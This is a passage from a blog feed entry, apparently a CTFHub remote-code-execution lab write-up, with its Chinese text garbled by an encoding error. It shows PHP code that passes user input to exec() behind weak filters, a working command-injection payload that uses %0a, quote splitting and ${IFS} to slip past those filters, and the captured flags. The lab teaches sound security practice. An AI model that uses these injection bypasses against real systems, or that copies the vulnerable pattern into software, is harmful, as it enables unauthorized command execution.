class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†|å’Œ&amp;ç¬¦å·ï¼Œä½†æ˜¯å¯ä»¥ç”¨åˆ†å·;</p><blockquote><p>ctfhub{83f8b09d42bb7631282a83b4}</p></blockquote><h2 id="ç»¼åˆè¿‡æ»¤ç»ƒä¹ ">ç»¼åˆè¿‡æ»¤ç»ƒä¹ </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹ï¼Œè¿‡æ»¤äº†|&amp;; ï¼Œå¯ä»¥ä½¿ç”¨%0aæ¥ä½œä¸ºå›è½¦ç¬¦ä½¿ç”¨ï¼Œæ•ˆæœä¸€æ ·</p><p>è¿‡æ»¤ä¸‰ä¸ªå…³é”®å­—cat,flag,ctfhubï¼Œå¯ä»¥ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·æˆ–è€…ä¸¤ä¸ªåŒå¼•å·ç»•è¿‡</p><p>è¿‡æ»¤ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨${IFS}ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als$&#123;IFS&#125;-al%0acd$&#123;IFS&#125;fla&#x27;&#x27;g_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;f*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130130405955.png" alt="image-20241130130405955"></p><blockquote><p>ctfhub{cbff46daeb4e000265fb35d6}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHubæŠ€èƒ½æ ‘-rceç³»åˆ—wp</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
</feed>
